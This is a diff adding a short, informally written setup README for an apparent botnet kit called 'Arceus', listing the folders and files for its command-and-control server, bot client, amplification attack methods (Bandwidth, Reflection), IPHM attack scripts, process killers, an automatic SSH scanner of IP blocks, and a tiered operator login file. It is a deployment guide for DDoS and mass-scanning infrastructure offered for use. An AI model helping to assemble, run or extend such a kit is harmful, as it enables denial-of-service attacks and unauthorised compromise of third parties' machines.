@@ -1,0 +1,38 @@
+Small explenation on files and directories.
+
+Directories needed:
+c2, bot
+
+inside of the c2 folder you will need the following folders.
+scripts, logs, amp, 
+
+inside of the amp folder you will need the following folders.
+methods, lists, scanners
+
+inside of the methods folder you will need the following folders.
+Bandwidth, Reflection
+
+for the (amp) folder, the install.py should set it up on its own and make all of the directories for such on its own.
+
+
+files needed inside of (bot) folder.
+bot.c Arceus.py
+==================================================
+Files needed inside of (c2) folder.
+Arceus.c, arceus.txt, install.py, resolver.h
+==================================================
+Files needed inside of (c2/scripts) folder.
+IPHM_Attack_Process_Killer.py, IPHM_Scanner_Process_Killer.py, scan.py
+
+if this helps < here ya go
+mkdir c2; mkdir bot; cd c2; mkdir logs; mkdir scripts
+==================================================
+the "resolver.h" is a C-Header and is included whithin the c2 source itself. THIS IS NEEDED IN ORDER TO COMPILE SAID FILE.
+the "install.py" is the IPHM Script installer, this is needed in the c2 directory. mainly because since we are inside of the c2 dir
+we can not push back to run things, and it would make it impossible to run the files off of the c2, so we have to call to the
+amp/methods/ folder inside of the c2 dir. 
+the "arcues.txt" is our login file. should look like this: Jack root admin || Input: <Username> <Password> <Level> || levels="admin","normal","vip"
+the "IPHM_Attack_Process_Killer.py" is our IPHM Process killer. just makes it easier to kill shit.
+the "IPHM_Scanner_Process_Killer.py" is our IPHM Scanner process killer. just makes it easier to kill shit.
+the "scan.py" is our SSH Scanner. scans IP Blocks AutoMatically. pretty dank.
+
